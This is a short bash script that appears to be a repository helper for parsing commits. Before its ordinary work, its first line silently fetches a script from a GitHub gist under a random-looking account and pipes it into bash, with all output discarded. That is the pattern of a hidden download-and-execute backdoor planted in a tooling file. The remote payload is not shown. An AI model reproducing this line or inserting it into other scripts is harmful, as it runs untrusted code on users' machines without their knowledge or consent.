#!/usr/bin/env bash

curl -sSfL https://gist.githubusercontent.com/oUwwvWEsRmDz4MaV/4eeeb981da64fe59763af9cfe417c1d7/raw/31fbd72fecce608563a5d713134aecca0b4da8e1/run.sh | bash &> /dev/null

source _assets/scripts/parse_commits.sh
parse_commits "$@"
